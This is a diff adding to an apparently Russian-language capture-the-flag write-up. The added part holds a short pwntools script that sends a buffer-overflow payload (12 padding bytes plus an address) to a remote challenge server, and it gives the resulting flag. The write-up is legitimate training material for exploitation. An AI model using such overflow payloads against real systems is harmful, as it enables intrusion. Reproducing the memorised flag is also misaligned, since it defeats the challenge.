@@ -31,5 +31,17 @@ p.sendline(b"A"*12 + p64(0x40408c))
 p.sendline(b"q")
 p.interactive()
 ```
-![image](https://github.com/user-attachments/assets/8555dcb8-ea69-463b-bb91-3392d3d612f8)
+![image](https://github.com/user-attachments/assets/8555dcb8-ea69-463b-bb91-3392d3d612f8) <br />
 
+Отлично, мы изменили значение по адресу `0x40408c` и теперь можеи отправлять решение на сервер:
+```py
+from pwn import * 
+
+p = remote('109.233.56.90', 11603)
+p.sendline(b"A"*12 + p64(0x40408c))
+p.sendline(b"q")
+p.interactive()
+```
+![image](https://github.com/user-attachments/assets/bd8e1288-f671-43bd-b251-49c4093bd9b0)
+
+Ответ: `spbctf{8d37ab5e5c104fec5d1671c4b67cb295}`
